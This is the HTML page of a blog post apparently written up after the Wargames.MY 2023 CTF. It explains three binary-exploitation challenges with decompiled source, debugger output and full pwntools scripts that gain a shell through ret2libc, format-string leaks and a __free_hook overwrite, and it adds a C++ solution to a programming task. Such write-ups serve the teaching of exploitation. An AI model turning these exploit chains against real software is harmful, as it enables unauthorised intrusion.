@@ -1,0 +1,970 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Wargames.MY 2023 | zeynarz</title>
+<meta name="keywords" content="">
+<meta name="description" content="writeups for wargames.my 2023 pwn (and 1 ppc) challs">
+<meta name="author" content="">
+<link rel="canonical" href="https://zeynarz.github.io/posts/wgmy23/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.5cfc680b1eeaeef9efbced92d46c2a9e876b72ee14fba85846afc4cff9e6e6f8.css" integrity="sha256-XPxoCx7q7vnvvO2S1Gwqnodrcu4U&#43;6hYRq/Ez/nm5vg=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://zeynarz.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://zeynarz.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://zeynarz.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://zeynarz.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://zeynarz.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Wargames.MY 2023" />
+<meta property="og:description" content="writeups for wargames.my 2023 pwn (and 1 ppc) challs" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://zeynarz.github.io/posts/wgmy23/" />
+<meta property="og:image" content="https://zeynarz.github.io/wgmy23/logo.jpg" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-12-16T22:09:37+08:00" />
+<meta property="article:modified_time" content="2023-12-16T22:09:37+08:00" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://zeynarz.github.io/wgmy23/logo.jpg" />
+<meta name="twitter:title" content="Wargames.MY 2023"/>
+<meta name="twitter:description" content="writeups for wargames.my 2023 pwn (and 1 ppc) challs"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://zeynarz.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Wargames.MY 2023",
+      "item": "https://zeynarz.github.io/posts/wgmy23/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Wargames.MY 2023",
+  "name": "Wargames.MY 2023",
+  "description": "writeups for wargames.my 2023 pwn (and 1 ppc) challs",
+  "keywords": [
+    
+  ],
+  "articleBody": "Overview I played in Wargames.MY 2023 ctf as a solo player, and managed to get first blood on all three of the pwn challs, as well as solve 1 ppc chall. Wargames.MY is pretty much the most famous Malaysian ctf currently, and some of my Malaysian ctf friends were talking to me about it, so I decided to give it a try.\nAll attachments can be found here\nMagic Door (pwn) checksec:\n[*] '/home/vagrant/ctf/wgmy23/magic_door/magic_door' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x3fe000) src.c void open_the_door(void){ int iVar1; char local_18 [12]; int local_c; initialize(); puts(\"Welcome to the Magic Door !\"); printf(\"Which door would you like to open? \"); __isoc99_scanf(\"%11s\",local_18); getchar(); iVar1 = strcmp(local_18,\"50015\"); if (iVar1 == 0) { no_door_foryou(); } else { local_c = atoi(local_18); if (local_c == 50015) { magic_door(50015); } else { no_door_foryou(); } } return; } void magic_door(void){ undefined8 local_48; undefined8 local_40; undefined8 local_38; undefined8 local_30; undefined8 local_28; undefined8 local_20; undefined8 local_18; undefined8 local_10; local_48 = 0; local_40 = 0; local_38 = 0; local_30 = 0; local_28 = 0; local_20 = 0; local_18 = 0; local_10 = 0; puts(\"Congratulations! You opened the magic door!\"); puts(\"Where would you like to go? \"); fgets((char *)\u0026local_48,0x100,stdin); return; } There is an obvious buffer overflow in the magic_door function, and since stack canary is disabled, a simple ret2libc will allow us to get a shell pretty quickly.\nThe tricky part is actually getting to the magic_door function call.\nThe program first asks which door you would like to open, and exits if you enter 50015. However, the program later checks to see if the door you want to open is 50015, and exits if its not.\nSo in other words, you can’t enter 50015, but you HAVE to enter 50015.\nSo how can you get past that? Negative numbers!\nIn memory, negative integers are stored in two’s complement form.\nSo -1 would be stored as 0xffffffff, -2 would be stored as 0xfffffffe, and so on.\nSo essentially,\n-a in memory: 0x100000000 - a So if we want 50015 to be in local_c, one way is we can enter 50015, and the other is by entering -(0x100000000-50015), which is -4294917281. This is so that the two’s complement of 4294917281, which is 0x100000000-4294917281=50015, will be stored in memory!\nThis way, we can pass both checks and get into the magic_door function.\nTo learn more about negative numbers in memory, you can look at this liveoverflow video or read this wikipedia page\nAfter getting into the magic_door function, I just made a rop that leaks puts@got to leak libc, and then restart the program. Then I just used a ret2libc to get a shell.\nThe libc version that the server uses isn’t given in the handout, so in order to find it (so that I can accurately calculate function offsets correctly in my exploit), I leaked the puts@libc and printf@libc addresses on remote using puts@got and printf@got, and then used a libc database search to find the correct libc version\nexploit.py from pwn import * #io = process(\"./magic_door\",aslr=False) io = remote(\"13.229.222.125\",32837) libc = ELF(\"./libc.so.6\") # gadgets entry = p64(0x401190) popRdi = p64(0x401434) putsPlt = p64(0x4010e0) putsGot = p64(0x404018) ret = p64(0x401388) io.sendlineafter(b\"Which door would you like to open?\",b\"-4294917281\") # leak libc and restart binary rop = b\"A\"*0x48 rop += popRdi + putsGot + putsPlt + entry io.sendlineafter(b\"Where would you like to go?\",rop) io.recv() libc.address = u64(io.recv(6).ljust(8,b\"\\x00\")) - libc.symbols[\"puts\"] log.info(\"LIBC BASE: \" + hex(libc.address)) io.sendlineafter(b\"Which door would you like to open?\",b\"-4294917281\") # I have to add a ret gadget to my rop to make the stack 64 bit aligned to prevent the movaps issue # more on that here: https://ropemporium.com/guide.html rop = b\"A\"*0x48 rop += ret + popRdi + p64(next(libc.search(b\"/bin/sh\"))) + p64(libc.symbols[\"system\"]) io.sendlineafter(b\"Where would you like to go?\",rop) io.interactive() Pak Mat Burger (pwn) checksec:\n[*] '/home/vagrant/ctf/wgmy23/pakmat_burger/pakmat_burger' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled src.c char * main(void){ int iVar1; char *secret; long in_FS_OFFSET; char local_3e [9]; char local_35 [10]; char name [12]; undefined local_1f [15]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); initialize(); secret = getenv(\"SECRET_MESSAGE\"); if (secret == (char *)0x0) { puts(\"Error: SECRET_MESSAGE environment variable not set. Exiting...\"); secret = (char *)0x1; } else { puts(\"Welcome to Pak Mat Burger!\"); printf(\"Please enter your name: \"); __isoc99_scanf(\"%11s\",name); printf(\"Hi \"); printf(name); printf(\", to order a burger, enter the secret message: \"); __isoc99_scanf(\"%8s\",local_3e); iVar1 = strcmp(local_3e,secret); if (iVar1 == 0) { puts(\"Great! What type of burger would you like to order? \"); __isoc99_scanf(\"%14s\",local_1f); getchar(); printf(\"Please provide your phone number, we will delivered soon: \"); secret = fgets(local_35,100,stdin); } else { puts(\"Sorry, the secret message is incorrect. Exiting...\"); secret = (char *)0x0; } } if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { __stack_chk_fail(); } return secret; } There are two obvious vulnerabilities here, a format string vuln, and a buffer overflow vuln. Let’s look at the rest of the program first to see what we’re dealing with.\nThe program first gets the secret from an environment variable SECRET_MESSAGE\nwhen testing locally, use export SECRET_MESSAGE=\"...\" to set the SECRET_MESSAGE environment variable\nLater on, the program asks for your name, and directly calls printf on it (this is where the format string vuln is). It then asks for the secret, and if you correctly input the secret, you get to write what type of burger you want, and your phone number (this is where the buffer overflow vuln is).\nSince we can control the first argument of a printf(.,.,.) call, it means that we can use \"%1$p\" to print the second arg, and \"%2$p\" to print the third arg, and so on and so forth\nSo let’s see what we can leak using the format string vuln by breaking at the printf call and looking at the arguments.\nI set the SECRET_MESSAGE env variable to “1337” locally\nBreakpoint 1, 0x000055555555542a in main () [ Legend: Modified register | Code | Heap | Stack | String ] ──────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ──── $rax : 0x0 $rbx : 0x0 $rcx : 0x00007ffff7ea7a77 → 0x5177fffff0003d48 (\"H=\"?) $rdx : 0x0 $rsp : 0x00007fffffffe290 → 0x00007fffffffee15 → 0x4744580037333331 (\"1337\"?) $rbp : 0x00007fffffffe2d0 → 0x0000000000000001 $rsi : 0x00007fffffffc170 → \"Hi ase enter your name: \" $rdi : 0x00007fffffffe2ad → 0x0000000000007025 (\"%p\"?) $rip : 0x000055555555542a → call 0x555555555150 $r8 : 0x3 $r9 : 0x0 $r10 : 0x00005555555560a8 → 0x0000000000206948 (\"Hi \"?) $r11 : 0x246 $r12 : 0x00007fffffffe3e8 → 0x00007fffffffe650 → \"/home/vagrant/ctf/wgmy23/pakmat_burger/pakmat_burg[...]\" $r13 : 0x0000555555555374 → endbr64 $r14 : 0x0000555555557d50 → 0x0000555555555280 → \u003c__do_global_dtors_aux+0\u003e endbr64 $r15 : 0x00007ffff7ffd040 → 0x00007ffff7ffe2e0 → 0x0000555555554000 → jg 0x555555554047 $eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification] $cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ──── 0x00007fffffffe290│+0x0000: 0x00007fffffffee15 → 0x4744580037333331 (\"1337\"?) ← $rsp 0x00007fffffffe298│+0x0008: 0x0000000000000000 0x00007fffffffe2a0│+0x0010: 0x0000000000000000 0x00007fffffffe2a8│+0x0018: 0x0070250000000000 0x00007fffffffe2b0│+0x0020: 0x0000000000000000 0x00007fffffffe2b8│+0x0028: 0x0000000000000000 0x00007fffffffe2c0│+0x0030: 0x0000000000000000 0x00007fffffffe2c8│+0x0038: 0x4b9505916e213c00 ────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ──── 0x55555555541e lea rax, [rbp-0x23] 0x555555555422 mov rdi, rax 0x555555555425 mov eax, 0x0 → 0x55555555542a call 0x555555555150 ↳ 0x555555555150 endbr64 0x555555555154 bnd jmp QWORD PTR [rip+0x2e25] # 0x555555557f80 0x55555555515b nop DWORD PTR [rax+rax*1+0x0] 0x555555555160 endbr64 0x555555555164 bnd jmp QWORD PTR [rip+0x2e1d] # 0x555555557f88 0x55555555516b nop DWORD PTR [rax+rax*1+0x0] ────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ──── printf@plt ( $rdi = 0x00007fffffffe2ad → 0x0000000000007025 (\"%p\"?), $rsi = 0x00007fffffffc170 → \"Hi ase enter your name: \", $rdx = 0x0000000000000000 ) So since this is an x86_64 binary, we are following the x86_64 calling convention.\n1st arg: stored in rdi 2nd arg: stored in rsi 3rd arg: stored in rdx 4th arg: stored in rcx 5th arg: stored in r8 6th arg: stored in r9 7th,8th,9th,... arg: stored at the top of the stack to learn more abt this and also see how C programs work in assembly, watch this liveoverflow video\nSo looking at the gdb output, we can see that the secret is stored at the top of the stack, which can be accessed by accesing the 7th argument of the printf call. Since \"%1$p\" refers to the second argument, we can use \"%6$s\" to leak the secret.\nAfter connecting to the server and leaking the secret multiple times, it can be seen that the secret stays the same through all connections. So you just have to leak it once, and you won’t have to leak it again in your following exploits.\nthe secret is e31c8306 btw\nSo cool! Now we can leak the secret. Well, what else can we leak? Let’s continue examining the stack.\ngef➤ tele 0x00007fffffffe290 0x00007fffffffe290│+0x0000: 0x00007fffffffee15 → 0x4744580037333331 (\"1337\"?) ← $rsp 0x00007fffffffe298│+0x0008: 0x0000000000000000 0x00007fffffffe2a0│+0x0010: 0x0000000000000000 0x00007fffffffe2a8│+0x0018: 0x0070250000000000 0x00007fffffffe2b0│+0x0020: 0x0000000000000000 0x00007fffffffe2b8│+0x0028: 0x0000000000000000 0x00007fffffffe2c0│+0x0030: 0x0000000000000000 0x00007fffffffe2c8│+0x0038: 0x4b9505916e213c00 0x00007fffffffe2d0│+0x0040: 0x0000000000000001 ← $rbp 0x00007fffffffe2d8│+0x0048: 0x00007ffff7dbcd90 → mov edi, eax gef➤ canary [+] The canary of process 22462 is at 0x7ffff7d90768, value is 0x4b9505916e213c00 It seems like we can leak both the canary, and the libc using the format string vuln.\nDoing some simple counting, we find out that %13$p can be used to leak the canary, and %15$p can be used to leak a libc address, which we can use to calculate the libc base, and later on calculate the address of system@libc and the \"/bin/sh\" string in libc.\nI assumed that the libc used would be the same as the previous challenge, and it was indeed the same.\nSince we know the canary, we can easily bypass the canary check.\nAnd since we know the libc base address, we can just do a ret2libc with the buffer overflow.\nexploit.py from pwn import * #io = process(\"pakmat_burger\",aslr=False) io = remote(\"13.229.222.125\",32874) libc = ELF(\"./libc.so.6\") #secret = b\"1337\" secret = b\"e31c8306\" io.sendlineafter(b\"Please enter your name:\",b\"%15$p%13$p\") io.recvuntil(b\"Hi \") libc.address = int(io.recv(14).decode(),16) - 128 - 171280 log.info(\"LIBC BASE: \" + hex(libc.address)) canary = int(io.recv(18).decode(),16) log.info(\"CANARY: \" + hex(canary)) #gdb.attach(io,gdbscript=\"break *0x5555555554fe\") io.sendlineafter(b\"enter the secret message:\",secret) io.sendlineafter(b\"order?\",b\"abcd\") # gadgets found in libc popRdi = p64(libc.address + 0x2a3e5) ret = p64(libc.address + 0x2a3e6) rop = b\"A\"* 37 + p64(canary) + b\"A\"*8 rop += ret + popRdi + p64(next(libc.search(b\"/bin/sh\"))) + p64(libc.symbols[\"system\"]) io.sendlineafter(b\"soon:\",rop) io.interactive() Free Juice (pwn) checksec:\n[*] '/home/vagrant/ctf/wgmy23/free_juice/free_juice' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled src.c undefined8 main(void){ int local_c; initialize(); do { displayMenu(); printf(\"Enter your choice: \"); __isoc99_scanf(\"%d\",\u0026local_c); if (local_c == 3) { drinkJuices(); } else { if (local_c \u003c 4) { if (local_c == 1) { chooseJuices(); } else { if (local_c == 2) { refillJuices(); } else { LAB_00100fff: puts(\"Invalid choice. Please try again.\"); } } } else { if (local_c == 4) { puts(\"Exiting...\"); } else { if (local_c != 0x539) goto LAB_00100fff; secretJuice(); } } } if (local_c == 4) { return 0; } } while( true ); } void chooseJuices(void){ int local_c; displayAvailableJuices(); printf(\"Enter the number of the chosen juice (1-5): \"); __isoc99_scanf(\"%d\",\u0026local_c); if ((local_c \u003c 1) || (5 \u003c local_c)) { puts(\"Invalid selection. Please try again.\"); } else { chosenJuice = malloc(0x114); if (chosenJuice == (char *)0x0) { perror(\"Error allocating memory\"); exit(1); } strcpy(chosenJuice,availableJuices + (long)(local_c + -1) * 0x114); *(chosenJuice + 0x100) = *(\u0026DAT_00302120 + (long)(local_c + -1) * 0x114); strcpy(chosenJuice + 0x104,s_Orange_00302124 + (long)(local_c + -1) * 0x114); printf(\"You chose %s juice.\\n\",chosenJuice); } return; } void displayAvailableJuices(void){ int local_c; puts(\"Available Juices:\"); local_c = 0; while (local_c \u003c 5) { printf(\"%d. %s\\n\",(ulong)(local_c + 1),availableJuices + (long)local_c * 0x114); local_c = local_c + 1; } return; } void refillJuices(void){ if (chosenJuice == 0) { puts(\"Please choose a juice first.\"); } else { printf(\"Enter the quantity to refill: \"); __isoc99_scanf(\"%d\",chosenJuice + 0x100); puts(\"Juice refilled!\"); } return; } void drinkJuices(void){ if (chosenJuice == (void *)0x0) { puts(\"Please choose a juice first.\"); } else { puts(\"Enjoy the refreshing experience of your chosen juice. Cheers! \"); putchar(10); free(chosenJuice); chosenJuice = (void *)0x0; } return; } void secretJuice(void){ // option 1337 long in_FS_OFFSET; char local_118 [264]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); if (chosenJuice == (char *)0x0) { puts(\"Please choose a juice first.\"); } else { puts(\"Let us know what juices you need and we will get back to you!\"); __isoc99_scanf(\"%256s\",local_118); printf(\"Current Juice : \"); printf(local_118); strncpy(chosenJuice,local_118,0xff); chosenJuice[0xff] = '\\0'; putchar(10); } if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { __stack_chk_fail(); } return; } libc-2.23.so is given for this chall\nThis looks like a classic heap pwn challange.\nYou can essentially 1. allocate 0x120 chunks 2. free the chunk above wilderness 3. overflow the chunk above wilderness, and leak stuff using option 1337 The only tricky part of this challenge is that you can’t free whichever chunk you want, you can only free the chunk above wilderness, which makes us essentially not be able to put any chunk into the bins, since the chunk will consolidate with the wilderness when it is freed.\nThese conditions and the libc version made me think of House of Orange. Also, the challenge context, specifically “Orange juice”, confirmed my assumption that the intended solution requires a House of Orange attack.\nWe also have all the requirements needed to perform a House of Orange attack.\n1. we have a heap overflow that can overwrite the top chunk 2. we have a libc and heap infoleak using the format string vuln As I was thinking of how to execute this attack on this challenge, it suddenly came to me, that I can actually just pwn this binary by solely using the format string vuln. I mean think about it, we can use option 1337 as many times as we want, meaning that we can use the format string vuln as many times as we want, meaning we have unlimited arbitary overwrites.\nfor a short minute I thought this exploit wouldn’t work since it reads in strings and I can’t write the packed 64 bit address as it contains null bytes, but then I realised you could just put the address at the end of the format string payload. lol\nWhat I did in the end was just leaking libc, and then overwriting __free_hook with system@libc, and writing \"/bin/sh\" into my juice, and freeing it.\nexploit.py from pwn import * #io = process(\"./free_juice\") io = remote(\"13.229.222.125\",33156) libc = ELF(\"./libc-2.23.so\") def chooseJuice(): io.sendlineafter(b\"Enter your choice:\",b\"1\") io.sendlineafter(b\"(1-5):\",b\"1\") def secretJuice(a): io.sendlineafter(b\"Enter your choice:\",b\"1337\") io.sendlineafter(b\"you!\",a) def drinkJuice(): io.sendlineafter(b\"Enter your choice:\",b\"3\") chooseJuice() # leak libc secretJuice(b\"%13$p\") io.recvuntil(b\": \") libc.address = int(io.recv(14).decode(),16) - 271 - libc.symbols[\"__isoc99_scanf\"] log.info(\"LIBC BASE: \" + hex(libc.address)) # cheese the chall # overwrite __free_hook with system system = p64(libc.symbols[\"system\"])[:-2] freehook = libc.symbols[\"__free_hook\"] log.info(\"system@libc: \" + hex(libc.symbols[\"system\"])) log.info(\"__free_hook: \" + hex(libc.symbols[\"__free_hook\"])) for i in system: formatstr = b\"%\" + str(i).rjust(3,\"0\").encode() + b\"c\" formatstr += b\"%8$hhn\" formatstr = formatstr.ljust(16,b\"A\") formatstr += p64(freehook)[:-2] secretJuice(formatstr) freehook += 1 secretJuice(b\"/bin/sh;\") drinkJuice() io.interactive() Alternative solutions I’m pretty sure that the intended solution for this chall is to use a House of Orange attack, so I think I kinda cheesed it lol. But granted that the heap overflow primitive is so strong, and we can leak everything we want, I think the execution of the attack should be quite straighforward, and can be done by just following the how2heap House of Orange writeup.\nthe only part you have to change from the how2heap writeup is prob just the part where it calculates the new wilderness size.\nOther ways that I think this chall could be solved:\nAbusing exit handlers (more on this on my previous blog post, and this article) Overwriting the jump table ptr in stdin/stdout/stderr. (I’m pretty sure this will work since the mitigation that checks the address of the vtable before virtual functions are called is added in gilbc 2.24) Copying the exploit strategy of House of Orange, and forge a fake _IO_FILE struct, place it in _IO_list_all using format string vuln, and cause malloc_printerr to run Linux Memory Usage (ppc) The problem simplified was essentially (worded by myself):\nYou are given N processes, and you are given its 1. pid 2. ppid 3. memory used For each query, you have to give the total memory used by the process, which is its own memory used plus all the memory used by its children My approach is quite straightforward.\nI made a Process class in cpp, which had the properties pid,ppid,mem, and children, which is a vector. I also made a hashmap to store all the Process objects.\nThe Process class also has a recursive method called Process.memUsed(), which adds up its own mem used with all the mem its children used. To find the mem used by its children, child.memUsed() is called (which is why I say the method is recursive)\nHowever, this solution isn’t fast enough, and will exceed the limit.\nSo to solve this, I made a new property in the Process class called totalmem, and store the value calculated by Process.memUsed() in it. This way if memUsed() is called upon the same Process object multiple times, the method won’t have to repeatedly find out the total memory, and can just use the value stored in totalmem.\nsolve.cpp #include using namespace std; class Process { public: int pid; int ppid; int mem; int totalmem = 0; vector\u003cProcess*\u003e children; Process(){ pid = 0; ppid = 0; mem = 0; } Process(int a, int b, int c){ pid = a; ppid = b; mem = c; } int memUsed(){ if (totalmem != 0){ // this has alr been calculated return totalmem; } int total = mem; for (Process* child : children){ total += child-\u003ememUsed(); } totalmem = total; return total; } }; int main(){ int n,q; cin \u003e\u003e n \u003e\u003e q; int a,b,c; unordered_map \u003cint,Process*\u003e hashmap; for (int i = 0; i \u003c n; i++) { cin \u003e\u003e a \u003e\u003e b \u003e\u003e c; Process *current = new Process(a,b,c); hashmap.insert({a,current}); if (b != 0) hashmap[b]-\u003echildren.push_back(current); } int pid; for (int i = 0; i \u003c q; i++){ cin \u003e\u003e pid; cout \u003c\u003c hashmap[pid]-\u003ememUsed() \u003c\u003c endl; } return 0; } Conclusion Overall, I think its not a bad ctf for ctf beginners (for pwn at least) since the challs aren’t too easy and aren’t rly that hard, so beginners will actually feel challenged when solving them, but will be able to solve them and learn a lot along the way if they do enough research and well, spend enough time on them. And even if they don’t solve them, a lot is still learned in the end, which at the end of the day, is still a huge W.\nThe organisers said that they tried to up the difficulty of the challenges this year compared to last year so that Malaysia students can improve and can compete in the international level and tbh I think that’s great! Respect to the organisers for trying to build up the Malaysian ctf scene and I wish nothing but the best for them. Hope that I can do the same and help build the Malaysian ctf community in some way in the future as well.\nHope that there are more pwn challs next year tho since there were like 8 web challs and only 3 pwn challs. I couldn’t rly do anything else after blooding the pwn challs and solving the ppc chall since I’m too noob at crypto and rev, and I hate dislike doing web (ig this is a personal skill issue). But all in all, gg!\n",
+  "wordCount" : "3189",
+  "inLanguage": "en",
+  "image":"https://zeynarz.github.io/wgmy23/logo.jpg","datePublished": "2023-12-16T22:09:37+08:00",
+  "dateModified": "2023-12-16T22:09:37+08:00",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://zeynarz.github.io/posts/wgmy23/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "zeynarz",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://zeynarz.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://zeynarz.github.io/" accesskey="h" title="zeynarz (Alt + H)">zeynarz</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://zeynarz.github.io/posts/" title="posts">
+                    <span>posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://zeynarz.github.io/aboutme/" title="about me">
+                    <span>about me</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://zeynarz.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://zeynarz.github.io/posts/">Posts</a></div>
+    <h1 class="post-title">
+      Wargames.MY 2023
+    </h1>
+    <div class="post-meta"><span title='2023-12-16 22:09:37 +0800 +08'>December 16, 2023</span>&nbsp;·&nbsp;15 min
+
+</div>
+  </header> 
+<figure class="entry-cover"><a href="https://zeynarz.github.io/wgmy23/logo.jpg" target="_blank"
+            rel="noopener noreferrer"><img loading="lazy" src="https://zeynarz.github.io/wgmy23/logo.jpg" alt="wgmy logo"></a>
+        <p>wgmy logo</p>
+</figure>
+  <div class="post-content"><h2 id="overview">Overview<a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h2>
+<p>I played in Wargames.MY 2023 ctf as a solo player, and managed to get first blood on all three of the pwn challs, as well as solve 1 ppc chall. Wargames.MY is pretty much the most famous Malaysian ctf currently, and some of my Malaysian ctf friends were talking to me about it, so I decided to give it a try.</p>
+<p>All attachments can be found <a href="https://github.com/Zeynarz/ctf/tree/main/wgmy23">here</a></p>
+<h2 id="magic-door-pwn">Magic Door (pwn)<a hidden class="anchor" aria-hidden="true" href="#magic-door-pwn">#</a></h2>
+<p><img loading="lazy" src="/wgmy23/blood1.png" alt="magic_door first blood 🩸"  />
+
+<strong>checksec</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-txt" data-lang="txt"><span style="display:flex;"><span>[*] &#39;/home/vagrant/ctf/wgmy23/magic_door/magic_door&#39;
+</span></span><span style="display:flex;"><span>    Arch:     amd64-64-little
+</span></span><span style="display:flex;"><span>    RELRO:    Partial RELRO
+</span></span><span style="display:flex;"><span>    Stack:    No canary found
+</span></span><span style="display:flex;"><span>    NX:       NX enabled
+</span></span><span style="display:flex;"><span>    PIE:      No PIE (0x3fe000)
+</span></span></code></pre></div>
+
+<p><details >
+  <summary markdown="span"><strong>src.c</strong></summary>
+  <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">open_the_door</span>(<span style="color:#66d9ef">void</span>){
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> iVar1;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> local_18 [<span style="color:#ae81ff">12</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> local_c;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">initialize</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Welcome to the Magic Door !&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Which door would you like to open? &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#e6db74">&#34;%11s&#34;</span>,local_18);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">getchar</span>();
+</span></span><span style="display:flex;"><span>  iVar1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strcmp</span>(local_18,<span style="color:#e6db74">&#34;50015&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (iVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">no_door_foryou</span>();
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    local_c <span style="color:#f92672">=</span> <span style="color:#a6e22e">atoi</span>(local_18);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (local_c <span style="color:#f92672">==</span> <span style="color:#ae81ff">50015</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">magic_door</span>(<span style="color:#ae81ff">50015</span>);
+</span></span><span style="display:flex;"><span>    }
